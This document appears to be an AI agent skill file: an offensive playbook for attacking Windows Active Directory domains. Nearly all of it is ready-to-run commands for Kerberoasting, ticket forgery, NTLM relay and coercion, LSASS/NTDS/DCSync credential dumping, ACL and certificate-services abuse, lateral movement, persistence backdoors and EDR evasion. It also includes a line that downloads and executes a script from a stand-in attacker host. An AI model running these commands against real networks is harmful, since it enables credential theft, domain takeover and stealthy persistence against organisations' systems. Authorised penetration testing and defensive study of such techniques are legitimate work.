---
name: active_directory
description: Learn Windows AD attacks: Kerberoasting, AS-REP Roasting, Pass-the-Hash, NTLM relay, BloodHound enumeration, delegation abuse, AD CS exploitation (ESC1-ESC15), DCSync, and domain privilege escalation with EDR evasion techniques.
---
# Active Directory Attacks

## When to Use This Skill

- Attacking Windows domain environments after initial access
- Performing Kerberos attacks (Kerberoasting, AS-REP Roasting, delegation abuse)
- Exploiting NTLM authentication (relay attacks, Pass-the-Hash)
- Enumerating AD with BloodHound to find attack paths
- Extracting credentials (DCSync, LSASS, NTDS.dit)
- Attacking AD Certificate Services (ESC1-ESC15)
- Establishing persistence in domain environments

---

## Concepts

### Active Directory Architecture

- **Forest** — Security boundary, contains one or more domains
- **Domain** — Administrative boundary, shares namespace and directory
- **Trust** — Relationship allowing cross-domain authentication
- **Organizational Unit (OU)** — Container for organizing objects, applying GPOs

### Kerberos Authentication Flow

1. **AS-REQ** — Client requests TGT from KDC using password hash
2. **AS-REP** — KDC returns TGT encrypted with krbtgt hash
3. **TGS-REQ** — Client presents TGT, requests service ticket
4. **TGS-REP** — KDC returns service ticket encrypted with service account hash
5. **AP-REQ** — Client presents service ticket to target service

Key insight: Service tickets are encrypted with service account password hashes — if we can request one, we can crack it offline (Kerberoasting).

### NTLM Authentication Flow

1. Client sends username to server
2. Server responds with challenge (nonce)
3. Client encrypts challenge with password hash, sends response
4. Server validates against DC (or locally)

Key insight: NTLM response can be relayed to another service before validation — the foundation of relay attacks.

---

## AD Enumeration

### BloodHound Collection

**SharpHound CE** (recommended for 2024+):
```powershell
# Default collection (groups, ACLs, local admins)
.\SharpHound.exe

# All collection methods
.\SharpHound.exe -c All

# ADCS collection (BloodHound 5.4+)
.\SharpHound.exe -c All,CARegistry

# Stealth mode (single-threaded, slower but quieter)
.\SharpHound.exe -c All --Stealth

# Session collection over time (2 hours, generates zip per loop)
.\SharpHound.exe --CollectionMethods Session --Loop --Loopduration 02:00:00

# Domain controller only (less noise)
.\SharpHound.exe -c DCOnly
```

**In-memory execution** (evade disk detection):
```
# Cobalt Strike
execute-assembly /path/to/SharpHound.exe -c All

# From Meterpreter
load powershell
powershell_execute "IEX(New-Object Net.WebClient).DownloadString('http://attacker/SharpHound.ps1'); Invoke-BloodHound -CollectionMethod All"
```

**BloodHound Queries** (Cypher):
```cypher
# Shortest path to Domain Admins
MATCH p=shortestPath((n)-[*1..]->(m:Group {name:"DOMAIN ADMINS@DOMAIN.LOCAL"}))
WHERE n<>m RETURN p

# Kerberoastable users
MATCH (u:User {hasspn:true}) RETURN u.name, u.serviceprincipalnames

# Users with DCSync rights
MATCH (n)-[:MemberOf|GetChanges|GetChangesAll*1..]->(d:Domain) RETURN n.name

# AS-REP Roastable users
MATCH (u:User {dontreqpreauth:true}) RETURN u.name

# Find computers where Domain Users can RDP
MATCH (g:Group {name:"DOMAIN USERS@DOMAIN.LOCAL"})-[:CanRDP]->(c:Computer) RETURN c.name
```

### PowerView Enumeration

```powershell
Import-Module .\PowerView.ps1

# Domain info
Get-Domain
Get-DomainController
Get-DomainPolicy

# User enumeration
Get-DomainUser | Select-Object samaccountname, description, memberof
Get-DomainUser -SPN  # Kerberoastable
Get-DomainUser -PreauthNotRequired  # AS-REP Roastable
Get-DomainUser -AdminCount  # Protected users

# Group enumeration
Get-DomainGroup -Identity "Domain Admins" -Recurse
Get-DomainGroupMember -Identity "Domain Admins"
Get-DomainGroup *admin*

# Computer enumeration
Get-DomainComputer | Select-Object dnshostname, operatingsystem
Get-DomainComputer -Unconstrained  # Unconstrained delegation
Get-DomainComputer -TrustedToAuth  # Constrained delegation

# ACL enumeration
Find-InterestingDomainAcl -ResolveGUIDs
Get-DomainObjectAcl -Identity "Domain Admins" -ResolveGUIDs

# GPO enumeration
Get-DomainGPO | Select-Object displayname, gpcfilesyspath
Get-DomainGPOLocalGroup  # GPOs granting local admin

# Trust enumeration
Get-DomainTrust
Get-ForestTrust
```

### LDAP Enumeration

```bash
# Anonymous bind check
ldapsearch -x -H ldap://dc.domain.local -b "DC=domain,DC=local"

# Authenticated enumeration
ldapsearch -x -H ldap://dc.domain.local -D "user@domain.local" -w 'password' -b "DC=domain,DC=local" "(objectClass=user)"

# Find SPNs (Kerberoastable)
ldapsearch -x -H ldap://dc.domain.local -D "user@domain.local" -w 'pass' -b "DC=domain,DC=local" "(&(objectClass=user)(servicePrincipalName=*))" samaccountname serviceprincipalname

# Find AS-REP Roastable
ldapsearch -x -H ldap://dc.domain.local -D "user@domain.local" -w 'pass' -b "DC=domain,DC=local" "(&(objectClass=user)(userAccountControl:1.2.840.113556.1.4.803:=4194304))" samaccountname
```

### Metasploit AD Enumeration

```
msf6 > use auxiliary/gather/ldap_query
msf6 > set RHOSTS dc.domain.local
msf6 > set DOMAIN domain.local
msf6 > set USERNAME user
msf6 > set PASSWORD password
msf6 > set ACTION ENUM_DOMAIN_USERS
msf6 > run

# Other actions: ENUM_DOMAIN_GROUPS, ENUM_DOMAIN_COMPUTERS, ENUM_SPNS
```

---

## Kerberos Attacks

### Kerberoasting

Service tickets are encrypted with service account password hashes — request tickets, crack offline.

**Impacket** (from Linux):
```bash
# Request TGS for all SPNs
GetUserSPNs.py -request -dc-ip 192.168.1.10 domain.local/user:password -outputfile kerberoast.txt

# Request specific SPN
GetUserSPNs.py -request -dc-ip 192.168.1.10 domain.local/user:password -request-user svc_sql
```

**Rubeus** (from Windows):
```powershell
# Kerberoast all SPNs
.\Rubeus.exe kerberoast /outfile:hashes.txt

# Target specific user
.\Rubeus.exe kerberoast /user:svc_sql /outfile:hashes.txt

# Request RC4 (easier to crack, more detectable)
.\Rubeus.exe kerberoast /rc4opsec /outfile:hashes.txt

# Use alternate credentials
.\Rubeus.exe kerberoast /creduser:domain\user /credpassword:pass
```

**Metasploit**:
```
msf6 > use auxiliary/gather/kerberos_enumusers
msf6 > set DOMAIN domain.local
msf6 > set RHOSTS dc.domain.local
msf6 > run
```

**Cracking** (hashcat mode 13100 for RC4, 19700 for AES):
```bash
# RC4 tickets
hashcat -m 13100 kerberoast.txt /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule

# AES tickets (slower)
hashcat -m 19700 kerberoast.txt wordlist.txt
```

**Evasion (2024 guidance)**:
- Request AES tickets instead of RC4 (less detectable but harder to crack)
- Microsoft recommends disabling RC4 — check if it's still enabled first
- Target accounts with weak passwords (gMSA/dMSA use 120+ char random passwords)

### AS-REP Roasting

Accounts with "Do not require Kerberos preauthentication" can be attacked without credentials.

**Impacket**:
```bash
# Find and extract AS-REP hashes
GetNPUsers.py domain.local/ -usersfile users.txt -dc-ip 192.168.1.10 -format hashcat -outputfile asrep.txt

# With valid credentials (enumerate automatically)
GetNPUsers.py domain.local/user:password -dc-ip 192.168.1.10 -request
```

**Rubeus**:
```powershell
# Find and roast AS-REP vulnerable users
.\Rubeus.exe asreproast /format:hashcat /outfile:asrep.txt

# Target specific user
.\Rubeus.exe asreproast /user:target /format:hashcat
```

**Cracking** (hashcat mode 18200):
```bash
hashcat -m 18200 asrep.txt /usr/share/wordlists/rockyou.txt
```

### Golden Ticket

Forge TGT using krbtgt hash — persist as any user indefinitely.

**Requirements**: krbtgt NTLM hash (from DCSync or NTDS.dit)

**Mimikatz**:
```
# Create golden ticket
kerberos::golden /user:Administrator /domain:domain.local /sid:S-1-5-21-... /krbtgt:hash /ptt

# With AES key (stealthier)
kerberos::golden /user:Administrator /domain:domain.local /sid:S-1-5-21-... /aes256:key /ptt
```

**Impacket**:
```bash
# Create ticket
ticketer.py -nthash krbtgt_hash -domain-sid S-1-5-21-... -domain domain.local Administrator

# Use ticket
export KRB5CCNAME=Administrator.ccache
psexec.py -k -no-pass domain.local/Administrator@dc.domain.local
```

**Detection**: Golden tickets have very long lifetimes (10 years default). Modern detection looks for TGTs not issued by legitimate DCs.

### Silver Ticket

Forge service ticket using service account hash — access specific service without touching DC.

**Impacket**:
```bash
# Create silver ticket for CIFS (file shares)
ticketer.py -nthash service_hash -domain-sid S-1-5-21-... -domain domain.local -spn CIFS/target.domain.local Administrator

# Use ticket
export KRB5CCNAME=Administrator.ccache
smbclient.py -k -no-pass domain.local/Administrator@target.domain.local
```

Common SPNs: `CIFS/host`, `HTTP/host`, `MSSQL/host`, `HOST/host`

### Delegation Attacks

#### Unconstrained Delegation

Servers with unconstrained delegation store user TGTs — compromise server, steal TGTs.

**Find unconstrained delegation**:
```powershell
Get-DomainComputer -Unconstrained
```

**Exploit with Rubeus** (monitor for TGTs):
```powershell
# Monitor for incoming TGTs
.\Rubeus.exe monitor /interval:5 /filteruser:DC01$

# Coerce DC to authenticate (from attacker machine)
# Use PetitPotam, PrinterBug, etc.
```

**Coercion techniques**:
```bash
# PetitPotam (MS-EFSRPC)
python3 PetitPotam.py -d domain.local -u user -p pass attacker_ip dc_ip

# PrinterBug (MS-RPRN)
python3 printerbug.py domain/user:pass@dc attacker_ip
```

#### Constrained Delegation (S4U)

Services with constrained delegation can impersonate users to specific services.

**Find constrained delegation**:
```powershell
Get-DomainComputer -TrustedToAuth
Get-DomainUser -TrustedToAuth
```

**Exploit with Impacket**:
```bash
# Get service ticket for allowed service as any user
getST.py -spn CIFS/target.domain.local -impersonate Administrator domain.local/svc_account:password -dc-ip 192.168.1.10

export KRB5CCNAME=Administrator.ccache
psexec.py -k -no-pass target.domain.local
```

**Rubeus**:
```powershell
# S4U2Self + S4U2Proxy
.\Rubeus.exe s4u /user:svc_account /rc4:hash /impersonateuser:Administrator /msdsspn:CIFS/target.domain.local /ptt
```

#### Resource-Based Constrained Delegation (RBCD)

Write msDS-AllowedToActOnBehalfOfOtherIdentity attribute to enable RBCD.

**Requirements**: Write access to target computer object + machine account

**Create machine account** (if MachineAccountQuota > 0):
```bash
addcomputer.py -computer-name 'ATTACKER$' -computer-pass 'Password123!' domain.local/user:password
```

**Set RBCD**:
```bash
# Using rbcd.py
rbcd.py -delegate-to TARGET$ -delegate-from ATTACKER$ -dc-ip 192.168.1.10 domain.local/user:password -action write
```

**BloodyAD** (alternative):
```bash
bloodyAD -d domain.local -u user -p pass --host dc_ip add rbcd TARGET$ ATTACKER$
```

**Get service ticket and access**:
```bash
getST.py -spn CIFS/target.domain.local -impersonate Administrator domain.local/'ATTACKER$':'Password123!' -dc-ip 192.168.1.10
export KRB5CCNAME=Administrator.ccache
psexec.py -k -no-pass target.domain.local
```

---

## NTLM Attacks

### Pass-the-Hash

Use NTLM hash directly without knowing plaintext password.

**Impacket**:
```bash
# PsExec
psexec.py -hashes :ntlm_hash domain/administrator@target

# WMIExec (stealthier)
wmiexec.py -hashes :ntlm_hash domain/administrator@target

# SMBExec
smbexec.py -hashes :ntlm_hash domain/administrator@target
```

**NetExec**:
```bash
netexec smb target -u administrator -H ntlm_hash
netexec smb target -u administrator -H ntlm_hash -x "whoami"
netexec smb target -u administrator -H ntlm_hash --sam  # Dump SAM
```

**Metasploit**:
```
msf6 > use exploit/windows/smb/psexec
msf6 > set RHOSTS target
msf6 > set SMBUser administrator
msf6 > set SMBPass aad3b435b51404eeaad3b435b51404ee:ntlm_hash
msf6 > exploit
```

**Mimikatz**:
```
sekurlsa::pth /user:Administrator /domain:domain.local /ntlm:hash /run:cmd.exe
```

### NTLM Relay

Relay captured NTLM authentication to another service.

**Requirements**: Target must not require SMB signing (for SMB relay), or EPA not enforced (for LDAP/HTTP relay)

**Find relay targets**:
```bash
netexec smb 192.168.1.0/24 --gen-relay-list relay_targets.txt
```

**Basic SMB relay**:
```bash
ntlmrelayx.py -tf relay_targets.txt -smb2support
```

**SOCKS proxy mode** (keep sessions for reuse):
```bash
ntlmrelayx.py -tf relay_targets.txt -smb2support -socks

# Use proxychains
proxychains smbclient //target/C$ -U 'domain/relayed_user'
```

**Relay to LDAP** (AD attacks):
```bash
# Escalate user to DCSync rights
ntlmrelayx.py -t ldap://dc.domain.local --escalate-user compromised_user

# Shadow Credentials attack
ntlmrelayx.py -t ldap://dc.domain.local --shadow-credentials --shadow-target 'TARGET$'

# RBCD attack
ntlmrelayx.py -t ldap://dc.domain.local --delegate-access
```

**Relay to AD CS** (ESC8):
```bash
ntlmrelayx.py -t http://ca.domain.local/certsrv/certfnsh.asp -smb2support --adcs --template DomainController
```

**Trigger authentication**:
```bash
# LLMNR/NBT-NS poisoning (same network)
responder -I eth0 -dwPv

# PetitPotam coercion
python3 PetitPotam.py attacker_ip dc_ip

# PrinterBug
python3 printerbug.py domain/user:pass@dc attacker_ip

# WebDAV coercion (triggers HTTP, bypassesthe SMB signing)
python3 PetitPotam.py -d domain.local -u user -p pass 'attacker@80/test' dc_ip
```

### Pass-the-Ticket

Inject Kerberos tickets for authentication.

**Export tickets with Mimikatz**:
```
sekurlsa::tickets /export
```

**Inject ticket**:
```
kerberos::ptt ticket.kirbi
```

**Rubeus**:
```powershell
# Dump tickets
.\Rubeus.exe dump

# Inject ticket
.\Rubeus.exe ptt /ticket:base64_ticket
```

**Impacket** (Linux):
```bash
export KRB5CCNAME=/path/to/ticket.ccache
psexec.py -k -no-pass domain.local/user@target
```

---

## Credential Extraction

### LSASS Dumping

**Mimikatz** (requires admin):
```
privilege::debug
sekurlsa::logonpasswords
```

**ProcDump** (Microsoft signed, less detected):
```cmd
procdump.exe -accepteula -ma lsass.exe lsass.dmp
```

**comsvcs.dll** (built-in):
```cmd
rundll32.exe C:\Windows\System32\comsvcs.dll, MiniDump <lsass_pid> C:\temp\lsass.dmp full
```

**nanodump** (evasive):
```cmd
nanodump.exe --write C:\temp\lsass.dmp
```

**Parse dump offline**:
```bash
pypykatz lsa minidump lsass.dmp
```

**Metasploit**:
```
meterpreter > load kiwi
meterpreter > creds_all
meterpreter > kerberos_ticket_list
```

**PPL Bypass** (Windows 11 enables by default):
```
# PPLdump
PPLdump.exe lsass.exe lsass.dmp

# Using mimidrv (old systems)
!+ # Load driver
!processprotect /process:lsass.exe /remove
sekurlsa::logonpasswords
```

### DCSync

Replicate credentials from DC using Directory Replication Service.

**Requirements**: DS-Replication-Get-Changes and DS-Replication-Get-Changes-All

**Impacket**:
```bash
# Dump all hashes
secretsdump.py domain.local/user:password@dc.domain.local

# Specific user only (stealthier)
secretsdump.py -just-dc-user Administrator domain.local/user:password@dc.domain.local

# With hash
secretsdump.py -hashes :ntlm_hash domain.local/user@dc.domain.local

# With Kerberos ticket
secretsdump.py -k -no-pass domain.local/user@dc.domain.local
```

**Mimikatz**:
```
lsadump::dcsync /domain:domain.local /user:Administrator
lsadump::dcsync /domain:domain.local /all /csv
```

### NTDS.dit Extraction

**VSS Shadow Copy** (local on DC):
```cmd
vssadmin create shadow /for=C:
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\NTDS\ntds.dit C:\temp\ntds.dit
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SYSTEM C:\temp\SYSTEM
```

**ntdsutil**:
```cmd
ntdsutil "activate instance ntds" "ifm" "create full C:\temp" quit quit
```

**Parse offline**:
```bash
secretsdump.py -ntds ntds.dit -system SYSTEM LOCAL
```

### SAM/SYSTEM Extraction

```
# Metasploit
meterpreter > hashdump

# Mimikatz
lsadump::sam /system:SYSTEM /sam:SAM

# Impacket
secretsdump.py -sam SAM -system SYSTEM LOCAL
```

---

## ACL Abuse

### GenericAll

Full control over object — reset password, add to group, set SPN.

**On User**:
```powershell
# Reset password
Set-DomainUserPassword -Identity target -AccountPassword (ConvertTo-SecureString 'NewPassword123!' -AsPlainText -Force)

# Set SPN for Kerberoasting
Set-DomainObject -Identity target -Set @{serviceprincipalname='fake/spn'}
```

**On Group**:
```powershell
Add-DomainGroupMember -Identity "Domain Admins" -Members attacker
```

**On Computer**:
```powershell
# Set RBCD
$SD = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList "O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;S-1-5-21-...-1337)"
$SDBytes = New-Object byte[] ($SD.BinaryLength)
$SD.GetBinaryForm($SDBytes, 0)
Set-DomainObject -Identity target$ -Set @{'msds-allowedtoactonbehalfofotheridentity'=$SDBytes}
```

### WriteDACL

Grant yourself additional permissions.

```powershell
# Grant GenericAll to yourself
Add-DomainObjectAcl -TargetIdentity "Domain Admins" -PrincipalIdentity attacker -Rights All

# Grant DCSync rights
Add-DomainObjectAcl -TargetIdentity "DC=domain,DC=local" -PrincipalIdentity attacker -Rights DCSync
```

**BloodyAD**:
```bash
# Add DCSync rights
bloodyAD -d domain.local -u user -p pass --host dc_ip add dcsync attacker

# Remove after use
bloodyAD -d domain.local -u user -p pass --host dc_ip remove dcsync attacker
```

### WriteOwner

Take ownership of object, then modify DACL.

```powershell
# Take ownership
Set-DomainObjectOwner -Identity target -OwnerIdentity attacker

# Now grant yourself GenericAll
Add-DomainObjectAcl -TargetIdentity target -PrincipalIdentity attacker -Rights All
```

### ForceChangePassword

Reset password without knowing current password.

```powershell
Set-DomainUserPassword -Identity target -AccountPassword (ConvertTo-SecureString 'Password123!' -AsPlainText -Force)
```

```bash
# BloodyAD
bloodyAD -d domain.local -u user -p pass --host dc_ip set password target 'NewPassword123!'

# rpcclient
rpcclient -U 'domain/user%pass' dc_ip -c "setuserinfo2 target 23 'NewPassword123!'"
```

---

## AD CS Attacks

### ESC1 — Enrollee Supplies Subject

Template allows requestor to specify Subject Alternative Name (SAN) — request cert as any user.

**Find vulnerable templates**:
```bash
certipy find -u user@domain.local -p password -dc-ip 192.168.1.10 -vulnerable

# Look for: Enrollee Supplies Subject, Client Authentication EKU, low-priv enrollment
```

**Exploit**:
```bash
# Request cert as Domain Admin
certipy req -u user@domain.local -p password -dc-ip 192.168.1.10 -ca 'CA-NAME' -template 'VulnerableTemplate' -upn administrator@domain.local

# Authenticate with cert
certipy auth -pfx administrator.pfx -dc-ip 192.168.1.10
```

### ESC4 — Write Access to Template

Modify template to make it vulnerable to ESC1.

```bash
# Modify template
certipy template -u user@domain.local -p password -template VulnerableTemplate -save-old

# Now exploit as ESC1
certipy req -u user@domain.local -p password -ca 'CA-NAME' -template VulnerableTemplate -upn administrator@domain.local
```

### ESC8 — NTLM Relay to Web Enrollment

Relay NTLM to AD CS HTTP enrollment endpoint.

```bash
# Start relay server
ntlmrelayx.py -t http://ca.domain.local/certsrv/certfnsh.asp -smb2support --adcs --template DomainController

# Coerce DC authentication
python3 PetitPotam.py attacker_ip dc_ip

# Use certificate
certipy auth -pfx dc.pfx -dc-ip 192.168.1.10
```

### ESC15 / EKUwu (2024)

Version 1 templates vulnerable to Application Policy injection — bypass EKU restrictions.

```bash
# Check for vulnerable v1 templates with enrollment rights
certipy find -u user@domain.local -p password -vulnerable

# Exploit WebServer template for Client Authentication
certipy req -u user@domain.local -p password -ca 'CA-NAME' -template WebServer -application-policies "Client Authentication"
```

### Golden Certificate

Forge certificates using stolen CA private key — ultimate persistence.

```bash
# Extract CA key (requires CA compromise)
certipy ca -backup -u admin@domain.local -p password -ca 'CA-NAME'

# Forge certificate
certipy forge -ca-pfx ca.pfx -upn administrator@domain.local -subject 'CN=Administrator'

# Authenticate
certipy auth -pfx administrator_forged.pfx -dc-ip 192.168.1.10
```

---

## Lateral Movement

### Impacket Execution Methods

| Method | Noise Level | Creates Service | Network Protocol |
|--------|-------------|-----------------|------------------|
| psexec.py | High | Yes | SMB |
| smbexec.py | Medium | Yes (hidden) | SMB |
| wmiexec.py | Low | No | WMI/DCOM |
| atexec.py | Medium | No | SMB (Task Scheduler) |
| dcomexec.py | Low | No | DCOM |

```bash
# WMIExec (preferred for stealth)
wmiexec.py domain/user:password@target
wmiexec.py -hashes :ntlm_hash domain/user@target

# ATExec (scheduled task)
atexec.py domain/user:password@target "command"

# DCOMExec
dcomexec.py -object MMC20 domain/user:password@target
```

### NetExec Command Execution

```bash
# Execute command
netexec smb target -u user -p pass -x "whoami"
netexec smb target -u user -H hash -x "whoami"

# Execute PowerShell
netexec smb target -u user -p pass -X "Get-Process"

# Spray and execute
netexec smb targets.txt -u user -p pass -x "whoami" --continue-on-success
```

### WinRM / Evil-WinRM

```bash
# Password auth
evil-winrm -i target -u administrator -p 'Password123!'

# Pass-the-Hash
evil-winrm -i target -u administrator -H ntlm_hash

# Kerberos auth
evil-winrm -i target -r DOMAIN.LOCAL
```

### RDP with Hash

```bash
# Requires Restricted Admin mode
xfreerdp /v:target /u:administrator /pth:ntlm_hash /cert:ignore
```

---

## Persistence

### AdminSDHolder Backdoor

Protected groups' ACLs reset every 60 minutes from AdminSDHolder — backdoor it.

```powershell
Add-DomainObjectAcl -TargetIdentity "CN=AdminSDHolder,CN=System,DC=domain,DC=local" -PrincipalIdentity attacker -Rights All
```

Wait 60 minutes (or trigger SDProp manually) — attacker has GenericAll on all protected groups.

### DCShadow

Register as rogue DC to replicate malicious changes without logging.

```
# Mimikatz (2 sessions required)
# Session 1: Push changes
lsadump::dcshadow /object:target /attribute:primaryGroupID /value:512

# Session 2: Replicate
lsadump::dcshadow /push
```

### Skeleton Key

Inject master password into LSASS — authenticate as any user with password "mimikatz".

```
privilege::debug
misc::skeleton
```

Requires restart to clear. Only works on single DC at a time.

### SID History Injection

Add privileged SID to user's SID history — invisible privilege escalation.

```
# Add Domain Admin SID to user's history
lsadump::dcshadow /object:target /attribute:sidHistory /value:S-1-5-21-...-512
```

### Machine Account Persistence

Create or compromise machine account — harder to detect than user accounts.

```bash
addcomputer.py -computer-name 'PERSIST$' -computer-pass 'Password123!' domain.local/user:password
```

---

## Evasion and OPSEC

### EDR Evasion for Credential Theft

**Direct syscalls** (bypass user-mode hooks):
- SysWhispers2/3 for syscall generation
- Dumpert for LSASS dumping via direct syscalls
- NanoDump for evasive memory dumps

**NTDLL unhooking**:
```
# Load fresh ntdll from disk
NTDLL unhooking via suspended process technique (Perun's Fart)
```

**In-memory operations**:
- Avoid writing to disk
- Use execute-assembly for .NET tools
- Reflective loading for native binaries

### Kerberos Attack Evasion

| Attack | Detection | Evasion |
|--------|-----------|---------|
| Kerberoasting | RC4 ticket requests | Request AES tickets |
| AS-REP Roasting | Specific event IDs | Limited evasion possible |
| Golden Ticket | Long ticket lifetime | Use realistic lifetimes |
| DCSync | Replication from non-DC | Use legitimate admin hours |

### NTLM Relay Evasion

- Time attacks during business hours
- Relay to services outside SOC monitoring
- Use WebDAV (HTTP) instead of SMB where possible

### Living Off the Land

Use built-in Windows tools:
```cmd
# AD enumeration without PowerView
nltest /dclist:domain.local
net group "Domain Admins" /domain
dsquery user -name * -limit 0

# Remote execution
wmic /node:target process call create "cmd.exe /c whoami"
schtasks /create /tn "task" /tr "cmd.exe /c whoami" /sc once /st 00:00 /s target /u domain\user /p pass
```

---

## Workflows

### Domain Enumeration to Domain Admin

1. **Initial enumeration**:
   ```bash
   # Collect BloodHound data
   .\SharpHound.exe -c All

   # Import to BloodHound, find paths to DA
   ```

2. **Identify quick wins**:
   ```bash
   # Kerberoastable accounts
   GetUserSPNs.py -request domain.local/user:pass -dc-ip dc_ip

   # AS-REP Roastable
   GetNPUsers.py domain.local/ -usersfile users.txt -dc-ip dc_ip
   ```

3. **Crack hashes**:
   ```bash
   hashcat -m 13100 kerberoast.txt wordlist.txt
   hashcat -m 18200 asrep.txt wordlist.txt
   ```

4. **Exploit ACL misconfigs** (from BloodHound paths):
   ```bash
   # If WriteDACL on user
   bloodyAD -d domain.local -u user -p pass --host dc_ip set password target 'NewPass123!'
   ```

5. **Lateral movement** to high-value targets:
   ```bash
   wmiexec.py domain/compromised:pass@target
   ```

6. **Credential extraction** from compromised systems:
   ```
   sekurlsa::logonpasswords
   ```

7. **DCSync** once DA equivalent obtained:
   ```bash
   secretsdump.py domain.local/da_user:pass@dc.domain.local
   ```

### NTLM Relay Attack Workflow

1. **Identify relay targets**:
   ```bash
   netexec smb 192.168.1.0/24 --gen-relay-list relay_targets.txt
   ```

2. **Start relay server**:
   ```bash
   ntlmrelayx.py -tf relay_targets.txt -smb2support -socks
   ```

3. **Trigger authentication**:
   ```bash
   responder -I eth0 -dwPv
   # Or: python3 PetitPotam.py attacker_ip target_ip
   ```

4. **Use relayed sessions**:
   ```bash
   proxychains secretsdump.py -no-pass 'DOMAIN/RELAYED_USER@target'
   ```

### AD CS Attack Workflow

1. **Enumerate AD CS**:
   ```bash
   certipy find -u user@domain.local -p pass -dc-ip dc_ip -vulnerable
   ```

2. **Identify vulnerability class** (ESC1-ESC15)

3. **Exploit** (example ESC1):
   ```bash
   certipy req -u user@domain.local -p pass -ca 'CA-NAME' -template VulnTemplate -upn administrator@domain.local
   ```

4. **Authenticate with certificate**:
   ```bash
   certipy auth -pfx administrator.pfx -dc-ip dc_ip
   ```

5. **Use obtained hash** for further access:
   ```bash
   secretsdump.py -hashes :hash domain.local/administrator@dc.domain.local
   ```
